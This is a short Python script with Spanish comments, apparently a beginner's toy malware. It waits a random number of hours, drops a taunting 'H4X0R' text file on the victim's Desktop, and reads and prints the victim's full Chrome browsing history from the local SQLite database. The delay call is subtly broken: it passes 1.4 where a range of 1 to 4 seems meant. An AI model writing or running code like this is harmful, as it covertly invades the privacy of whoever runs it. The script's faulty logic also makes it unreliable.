import os
from time import sleep
from pathlib import Path
from random import randrange
import sqlite3

HACKER_FILE_NAME = "PARA TI.txt"

def get_user_path():
    return "{}/".format(Path.home())

def delay_action():
    n_hours = randrange(1.4)
    print("Durmiendo {}".format(n_hours))
    sleep(n_hours * 60 * 60)

def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola soy un H4X0R.")
    return hacker_file

def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible reintentando en 3s ...")
            sleep(3)


def main():
    
    # Esperamos entre 1 y 3 horas para que se ejecute
    delay_action()

    # Calculamos la ruta del usuario
    user_path = get_user_path()

    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)

    # Recogemos su historial en google chrome    
    chrome_history = get_chrome_history(user_path)
    print(chrome_history)


if __name__ == "__main__":
    main()